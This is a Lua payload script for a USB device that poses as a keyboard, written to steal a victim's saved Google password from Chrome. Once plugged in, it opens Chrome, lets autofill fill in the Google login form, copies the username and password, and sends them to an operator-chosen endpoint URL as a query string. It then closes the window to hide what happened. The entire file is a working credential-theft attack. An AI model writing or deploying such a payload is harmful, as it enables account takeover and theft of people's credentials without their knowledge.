---
--- Expose saved Google account password from Chrome
---
require("common")

kb = luausb.create({ type = "keyboard" })

-- This URL will be visited with the captured password appended to the end
local endpoint = prompt{
    message="Enter the URL of the end-point to query.",
    hint="End-point URL",
    default="https://localhost/index.php?q="
}

while true do
    print("idle")

    -- poll until usb plugged in
    wait_for_state("configured")
    wait_for_detect(kb)
    print("running")

    -- open chrome
    kb:chord(MOD_LSUPER, KEY_R)
    wait(1000)
    kb:string("chrome --incognito\n")
    wait(2000)

    -- navigate to login page
    kb:string("accounts.google.com")
    -- get rid of any autofill that appears in the omnibar
    kb:press(KEY_DELETE)
    kb:press(KEY_ENTER)
    wait(2000)

    -- autofill username and continue
    kb:press(KEY_DOWN);             wait(100)
    kb:press(KEY_DOWN);             wait(100)
    kb:press(KEY_ENTER);            wait(100)
    kb:chord(MOD_LCTRL, KEY_A);     wait(100)
    kb:chord(MOD_LCTRL, KEY_C);     wait(100)
    kb:press(KEY_ENTER)
    wait(4000)

    -- autofill password
    kb:press(KEY_TAB);              wait(100)
    kb:press(KEY_SPACE);            wait(100)
    kb:chord(MOD_LSHIFT, KEY_TAB);  wait(100)
    kb:press(KEY_LEFT);             wait(100)
    kb:chord(MOD_LCTRL, KEY_V);     wait(100)
    kb:string("|");                 wait(100)
    kb:chord(MOD_LCTRL, KEY_A);     wait(100)
    kb:chord(MOD_LCTRL, KEY_C)
    wait(100)

    -- open new tab and navigate to query string with captured password
    kb:chord(MOD_LCTRL, KEY_T)
    wait(1000)
    kb:string(endpoint)
    kb:chord(MOD_LCTRL, KEY_V)
    kb:press(KEY_ENTER)
    wait(4000)

    -- close everything we opened
    kb:chord(MOD_LALT, KEY_F4)
    wait(1000)

    print("done")
    wait_for_state("not attached")

    print("disconnected")
end

